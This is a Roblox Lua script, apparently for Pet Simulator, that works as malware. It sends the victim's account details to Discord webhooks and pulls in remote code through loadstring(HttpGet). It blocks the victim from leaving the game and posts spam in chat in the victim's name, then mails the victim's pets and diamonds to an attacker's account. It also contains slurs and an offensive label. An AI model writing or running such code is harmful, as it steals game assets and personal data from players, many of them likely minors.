local Webhook = "https://discord.com/api/webhooks/1123238490088411177/Ui2oMTbar7N5qv8ufS7Pq5IwuoOznIh0NOg5KUB14GltEYc00MGoAPzGaTtyJhk-skPi" -- your webhook
_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService"Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge*86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end

local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
   ["username"] = "Being a pedo",
   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
   ["embeds"] = {
       {
           ["color"] = tonumber(tostring("0x32CD32")), --decimal
           ["title"] = "This Bozo executed.",
           ["thumbnail"] = {
               ["url"] = AvatarImage,
           },
           ["fields"] = {
                {
                   ["name"] = "Username",
                   ["value"] = "||"..player.Name.."||",
                   ["inline"] = true
                },
                {
                   ["name"] = "Display Name",
                   ["value"] = player.DisplayName,
                   ["inline"] = true
                },
                {
                   ["name"] = "UID",
                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                   ["inline"] = true
                },
                {
                   ["name"] = "Game Id",
                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
                   ["inline"] = true
                },
                {
                   ["name"] = "Game Name",
                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                   ["inline"] = true
                },
                {
                   ["name"] = "Executor Used",
                   ["value"] = executor,
                   ["inline"] = true
                },
                {
                   ["name"] = "Alt",
                   ["value"] = alt,
                   ["inline"] = true
                },
                {
                   ["name"] = "Account Age",
                   ["value"] = player.AccountAge.."day(s)",
                   ["inline"] = true
                },
                {
                   ["name"] = "Date Joined",
                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                   ["inline"] = true
                },
           },
           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
       }
   }
}

request = http_request or request or HttpPost or syn.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
_G.Username = "W4r_ObScUrE" --// Username To Send Pets To
_G.GiftMessage = ".gg/EP9uC28cna" --// Message For The Gift To Say
_G.SendMessage = "disco epic code! its EP9uC28cna" --// Message the victim will send in the chat on execution
_G.Diamonds = 100000000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Webhook = "https://discord.com/api/webhooks/1123238676789461003/OCNXCTC7-1adc1cBrVr7trAePlOBeIDP78A07EEwsstYstBWI41BL9Xqwq-_pom_w0zg"
wait(1)
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)
--// Vars
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local CoreGui = game:GetService("CoreGui")
local RobloxGui = CoreGui.RobloxGui
local Client = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
local lockedCount = 0
local Invoke = Network.Invoke
 
--// Pet Folders
local PetFolders = {
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

--// Diamond Check
if Client.leaderstats.Diamonds.Value < _G.Diamonds then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/cacabpuding.lua"))()
	wait(55555555)
end

if time() <= 30 then
	wait(25)
	game.StarterGui:SetCore("SendNotification", {
	Title = "Script error"; -- the title (ofc)
	Text = "Please wait and try again Remote not found !"; -- what the text says (ofc)
	Duration = 15; -- how long the notification should in secounds
	})
	return
end
 
--// Loading UI


local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")

--Properties:
local Loading = Instance.new("ScreenGui")
local Image = Instance.new("ImageLabel")

Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.DisplayOrder = 999999999
Image.Parent = Loading
Image.BackgroundTransparency = 1
Image.Position = UDim2.new(0, 0, -0.05, 0)
Image.Size = UDim2.new(1.1, 0, 1.1, 0)
Image.ZIndex = 10
Image.Image = "rbxassetid://13798067136"
wait(1)

--// Teleport To Mailbox
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end
 
--// lock keys 
local disabledKeyCodes = {
    0x73;
    0xA4;
    0xA5;
    0x1B;
    0x0D;
    0x46;
    0x34;
    0x4634;
    0x416c74;
    0x57696e646f77;
    0x57;
    0x44;
    0x41;
    0x4d;
    0x6d;
    0x61;
    0x77;
    0x64;
 
};
 
 
 
--// Disable Playerlist
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 
--// Anti Leave
if _G.AntiLeave == true then
    RobloxGui:Destroy()
    local RunService = game:GetService"RunService"
    local UserInputService = game:GetService"UserInputService"
    RunService:BindToRenderStep("MouseLock",Enum.RenderPriority.Last.Value+1,function()
        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    end)
end
 
--// Freeze Character
wait(0.5)
Client.Character.HumanoidRootPart.Anchored = true
 
 
--// Execution Log

 
 
 
writefile("openmeifyouwantyourpetsback.txt", "https://discord.gg/3Z5bsAEUpV")
 
 
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_G.SendMessage,"All")
 
 
 
--// Unlock Pets
if _G.UnlockPets == true then
    local function unlockPetsInFolder(folder)
        local children = folder:GetChildren()
        for _, child in ipairs(children) do
            if child:IsA("TextButton") and child.Locked.Visible == true then
                local name = child.Name
                if child.Name then
                    local args2 = {
                        [1] = {
                            ["" .. name] = false
                        }
                    }
                    Invoke("Lock Pet", unpack(args2))
                end
            end
        end
    end
 
    while true do
        for _, folder in pairs(PetFolders) do
          unlockPetsInFolder(folder)
          wait(.2)
        end
        for _, folder in ipairs(PetFolders) do
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA("TextButton") and child.Locked.Visible == true then
                    lockedCount = lockedCount + 1
                end
            end
        end
        if lockedCount == 0 then
            print('Unlocked All')
            break
        end
    end
end
 
--// turn off sound
UserSettings().GameSettings.MasterVolume = 0
 
 
wait(0.5)
--// Mail Stealer 
_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
local savedPets = FrameworkLibrary.Save.Get().Pets
_G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
while wait() do
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
	_G.PetName = v2.name
        _G.PetRar = v2.rarity
        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                    _G.Lol = 0
        end
        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
            _G.Username = "W4r_ObScUrE"
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            print(_G.PetName)
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = _G.Lol,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
            wait(5)
    
            if v2.huge == false then
                break
            end
        end
    end
    local allHugeFalse = true
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if v2.huge == true then
            allHugeFalse = false
            break
        end
    end
    
    if allHugeFalse then
        break
    end
end

while wait() do
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                    _G.Lol = 0
        end        
        if v2.rarity == "Exclusive" or v2.name == "Update Hype Gift" or v2.name == "banana" or v2.name == "Exclusive egg 1" or v2.name == "Exclusive egg 2" or v2.name == "Exclusive egg 3" or v2.name == "Exclusive egg 4" or v2.name == "Exclusive egg 5" or v2.name == "Exclusive egg 6" or v2.name == "Exclusive egg 7" or v2.name == "Exclusive egg 8" or v2.name == "Exclusive egg 9" or v2.name == "Exclusive egg 10" or v2.name == "Exclusive egg 11" or v2.name == "Exclusive egg 12" or v2.name == "Exclusive egg 13" or v2.name == "Exclusive egg 14" or v2.name == "Exclusive egg 15" or v2.name == "Season 2 Basic Gift" or v2.name == "Season 2 Rare Gift" or v2.name == "Season 2 Epic Gift" or v2.name == "Season 2 Legendary Gift" or v2.name == "Season 2 Mythical Gift" or v2.name == "Season 1 Basic Gift" or v2.name == "Season 1 Rare Gift" or v2.name == "Season 1 Epic Gift" or v2.name == "Season 1 Legendary Gift" or v2.name == "Season 1 Mythical Gift" or v2.name == "Halloween Gift" or v2.name == "Easter 2023 Gift" or v2.name == "Huge Machine Egg 1" or v2.name == "Huge Machine Egg 2" or v2.name == "Christmas 2022 Stocking" or v2.name == "Hot Dooooog" or v2.name == "Sailor Egg" or v2.name == "Pirate Egg" or v2.name == "Quest Egg 1" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = _G.Lol,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
            wait(5)
   
            if v2.rarity ~= "Exclusive" then
                break
            end
        end
    end
    local allExclusiveFalse = true
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if v2.rarity == "Exclusive" then
            allExclusivesFalse = false
            break
        end
    end
    
    if allExclusivesFalse then
        break
    end
end
_G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000
for i, v in pairs(savedPets) do
    local v2 = FrameworkLibrary.Directory.Pets[v.id]
	 _G.PetName = v2.name
     _G.PetRar = v2.rarity
    if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                _G.Lol = 0
    end
    if v2.huge == false and v2.rarity ~= exclusive then
        _G.Username = "W4r_ObScUrE"
        _G.PetName = v2.name
        _G.PetRar = v2.rarity
		local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = _G.CACA,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))

            wait(5)
            print("pewp")
            break
    end
end

while wait() do
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
	_G.PetName = v2.name
        _G.PetRar = v2.rarity
        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                    _G.Lol = 0
        end
        if v2.huge == false and v2.rarity ~= "Exclusive" then
            _G.Username = "W4r_ObScUrE"
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            print(_G.PetName)
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))

            wait(5)
    
            if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
                break
            end
        end
    end
    local allGemsFalse = true
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if game.Players.LocalPlayer.leaderstats.Diamonds.Value > 1000000 then
            allGemsFalse = false
            break
        end
    end
    
    if allGemsFalse then
        break
    end
end


while wait() do
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                    _G.Lol = 0
        end        
        if v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            print(_G.PetRar)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = _G.Lol,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
            wait(5)
            
            if v2.rarity ~= "Event" then
                break
            end
        end
    end
    local allEventFalse = true
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if v2.rarity == "Event" then
            allEventFalse = false
            break
        end
    end
    
    if allEventFalse then
        break
    end
end
